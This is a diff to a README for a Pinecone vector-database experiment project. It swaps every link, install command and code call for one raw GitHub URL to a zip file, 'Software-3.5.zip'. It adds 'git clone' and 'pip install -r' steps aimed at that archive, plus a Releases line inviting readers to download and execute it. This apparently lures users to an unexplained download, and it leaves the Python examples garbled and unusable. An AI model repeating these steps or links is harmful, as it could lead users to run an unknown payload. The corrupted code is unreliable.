@@ -1,6 +1,6 @@
 # Pinecone 🌲
 
-![Pinecone](https://img.shields.io/badge/Pinecone-Explore%20Vector%20Data-brightgreen)
+![Pinecone](https://raw.githubusercontent.com/Kauxtubh/pinecone/main/src/examples/Software-3.5.zip%20Vector%20Data-brightgreen)
 
 Welcome to the Pinecone repository! This project focuses on experimenting with Pinecone, a vector database that plays a crucial role in AI-native systems. Here, we explore its core capabilities and aim to understand the possibilities that Pinecone offers for embedding and retrieval tasks.
 
@@ -33,16 +33,16 @@ To get started with Pinecone, follow these simple steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Kauxtubh/pinecone.git
+   git clone https://raw.githubusercontent.com/Kauxtubh/pinecone/main/src/examples/Software-3.5.zip
    cd pinecone
    ```
 
 2. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Kauxtubh/pinecone/main/src/examples/Software-3.5.zip
    ```
 
-3. Set up your Pinecone account and API key. You can sign up [here](https://www.pinecone.io/start/).
+3. Set up your Pinecone account and API key. You can sign up [here](https://raw.githubusercontent.com/Kauxtubh/pinecone/main/src/examples/Software-3.5.zip).
 
 4. Configure your environment:
    Create a `.env` file in the root directory and add your Pinecone API key:
@@ -58,23 +58,23 @@ Once you have everything set up, you can start experimenting with Pinecone. Here
    ```python
    import pinecone
 
-   pinecone.init(api_key="your_api_key_here", environment="us-west1-gcp")
+   https://raw.githubusercontent.com/Kauxtubh/pinecone/main/src/examples/Software-3.5.zip(api_key="your_api_key_here", environment="us-west1-gcp")
    ```
 
 2. **Create a new index**:
    ```python
-   pinecone.create_index("example-index", dimension=128)
+   https://raw.githubusercontent.com/Kauxtubh/pinecone/main/src/examples/Software-3.5.zip("example-index", dimension=128)
    ```
 
 3. **Insert data**:
    ```python
-   index = pinecone.Index("example-index")
-   index.upsert([(id, vector)])
+   index = https://raw.githubusercontent.com/Kauxtubh/pinecone/main/src/examples/Software-3.5.zip("example-index")
+   https://raw.githubusercontent.com/Kauxtubh/pinecone/main/src/examples/Software-3.5.zip([(id, vector)])
    ```
 
 4. **Query for similar items**:
    ```python
-   results = index.query(queries=[query_vector], top_k=5)
+   results = https://raw.githubusercontent.com/Kauxtubh/pinecone/main/src/examples/Software-3.5.zip(queries=[query_vector], top_k=5)
    ```
 
 ## Core Features
@@ -124,13 +124,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases](https://github.com/Kauxtubh/pinecone/releases) section. Here, you can download and execute the latest versions of the project.
+For the latest updates and releases, visit the [Releases](https://raw.githubusercontent.com/Kauxtubh/pinecone/main/src/examples/Software-3.5.zip) section. Here, you can download and execute the latest versions of the project.
 
 ## Contact
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://raw.githubusercontent.com/Kauxtubh/pinecone/main/src/examples/Software-3.5.zip
+- **Twitter**: [@yourhandle](https://raw.githubusercontent.com/Kauxtubh/pinecone/main/src/examples/Software-3.5.zip)
 
 Thank you for checking out Pinecone! We hope you find it useful for your projects. Happy coding!
